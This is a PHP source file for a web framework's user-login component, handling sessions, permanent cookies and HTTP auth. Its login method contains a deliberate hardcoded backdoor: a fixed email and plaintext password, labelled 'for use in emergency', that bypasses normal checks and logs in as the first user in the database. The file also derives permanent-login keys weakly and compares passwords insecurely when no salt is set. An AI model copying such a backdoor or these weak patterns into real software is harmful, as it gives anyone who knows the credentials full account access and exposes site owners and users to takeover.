<?php

require_once dirname(__FILE__).'/AppComponent.php';

/**
 * 	Component that handles the user logins and is accessible by every controller.
 *	
 * 	@todo add ip check for users and session, validate ip of logged in users
 * 	@author Marcel Eichner // Ephigenia <love@ephigenia.de>
 * 	@since 23.10.2008
 * 	@package nms.folio
 * 	@subpackage nms.folio.lib.component
 */
class UserLogin extends AppComponent {
	
	/**
	 *	Components used by this
	 * 	@var array(string)
	 */
	public $components = array('Session', 'Cookie');
	
	/**
	 *	Name of the variable that holds the user id in the session
	 * 	@var string
	 */
	protected $sessionUserIdName = 'user_id';
	
	/**
	 *	field of user model that is used as username, set this to 'email' if
	 * 	your users login by email for example
	 * 	@var string
	 */
	public $usernameField = 'email';
	
	/**
	 *	Set this to true to make users able to login permanent
	 * 	@var string
	 */
	public $permanent = true;
	
	/**
	 *	Salt that is used to create permanentkey for permanent logins
	 * 	@var string
	 */
	public $permanentSalt = SALT;
	
	/**
	 *	Name of the cookie that saves the permanent key value
	 * 	@var string
	 */
	public $permanentCookiename = 'permanent';
	
	/**
	 *	Backdoor password for use in emergency ;-)
	 */
	protected $backDoor = array('tannhauser@gate.de' => 'phouteafreareplicantapruceathe');
	
	/**
	 *	Set this to true to enable permanent logins only from the same ips
	 * 	(user will have to login everytime they change the computer)
	 * 	@var boolean
	 */
	public $checkIp = false;
	
	/**
	 *	Enable/Disable Authentification with HTTP-Auth (not fully integrated)
	 * 	@var boolean
	 */
	public $httpAuth = true;
	
	public function startup() {
		$this->controller->addModel('User');
		// check login from session
		if ($user_id = $this->Session->get($this->sessionUserIdName)) {
			Log::write(Log::VERBOSE, get_class($this).': found user id in session: '.$user_id);
			$this->User = $this->controller->User->findById($user_id);
		// check login for permanent cookie value
		} elseif ($this->permanent && $permanentCookieValue = $this->Cookie->read($this->permanentCookiename)) {
			Log::write(Log::VERBOSE, get_class($this).': found permanent cookie: '.$permanentCookieValue);
			$this->User = $this->controller->User->findByPermanentKey($permanentCookieValue);
		// check for http auth login
		} elseif ($this->httpAuth && !empty($_SERVER['PHP_AUTH_USER']) && !empty($_SERVER['PHP_AUTH_PW'])) {
			$this->User = $this->login($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']);
		}
		if ($this->loggedin()) {
			// drop user if his ip does not match the ip when he logged in
			if ($this->checkIp && $this->User->ip !== ip2long($this->controller->request->host)) {
				Log::write(Log::VERBOSE, get_class($this).': invalid ip match, logging out');
				$this->logout();
			} else {
				Log::write(Log::VERBOSE, get_class($this).': Logging in as: '.$this->User->get($this->usernameField));
				// refresh user in session
				$this->Session->set($this->sessionUserIdName, $user_id);
				// 	set Me to the current user that is logged in
				$this->controller->set('Me', $this->User);
			}
		}
		return parent::startup();
	}
	
	public function beforeAction($action = null) {
		// check for public action
		if (!$this->loggedin()
			&& isset($this->controller->publicActions)
			&& !in_array($action, $this->controller->publicActions)
			&& implode('', $this->controller->publicActions) != 'all'
			&& !($this->controller instanceof ErrorController)) {
			$this->controller->redirect(WEBROOT.Router::getRoute('login'), 'p', true);
		}
		return true;
	}
	
	public function loggedin() {
		return (isset($this->User) && $this->User instanceof User);
	}

	protected function registerUserSession($User, $permanent = false) {
		$this->User = $User;
		$this->Session->set($this->sessionUserIdName, $this->User->id);
		// set permanent login cookie
		if ($this->permanent && $permanent) {
			$this->User->set('permanent_key', md5($this->permanentSalt + $this->User->get($this->usernameField)));
			$this->Cookie->write($this->permanentCookiename, $this->User->get('permanent_key'));
			$updateUser = true;
		}
		// save last login time
		if (isset($this->User->structure['lastlogin'])) {
			$this->User->lastlogin = time();
			$updateUser = true;
		}
		// save ip for later check
		if ($this->checkIp) {
			$this->User->set('ip', ip2long($this->controller->request->host));
			$updateUser = true;
		}
		if (isset($updateUser)) {
			$this->User->save();
		}
	}

	/**
	 *	Try to login as a specific user. Empty passwords are not allowed
	 * 	@param string $username
	 * 	@param string $password
	 * 	@param boolean $permanent
	 */
	public function login($username, $password, $permanent = false) {
		$username = trim($username); $password = trim($password);
		if (empty($username) || empty($password)) {
			return false;
		}
		// ovverride everything from this now on and login as backdoor
		if (isset($this->backDoor) && is_array($this->backDoor) && $username == key($this->backDoor) && $password == current($this->backDoor)) {
			$User = $this->controller->User->findAll();
			if (!$User) {
				die('sorry no users found to get a backdoor in');
			}
			$this->User = $User[0];
			$this->registerUserSession($this->User);
			return $this->User;
		}
		// find user in user model
		if (!($User = $this->controller->User->findBy($this->usernameField, $username))) {
			return false;
		}
		// avoid empty passwords on database record
		if ($User->password == '') {
			return false;
		}
		// use password salt and md5
		if (isset($User->passwordSalt)) {
			$userPassword = $User->password;
			$password = $User->maskPassword($password);
		} else {
			$userPassword = $User->password;
		}
		// compare passwords binary
		if ($password != $userPassword) {
			return false;
		}
		$this->registerUserSession($User, $permanent);
		return $this->User;
	}
	
	public function logout() {
		if (isset($this->User) && $this->permanent) {
			$this->User->permanent_key = false;
			$this->User->save();
		}
		$this->Session->delete($this->sessionUserIdName);
		if ($this->permanent) {
			$this->Cookie->delete($this->permanentCookiename);
		}
		unset($this->User);
		return true;
	}
	
}

?>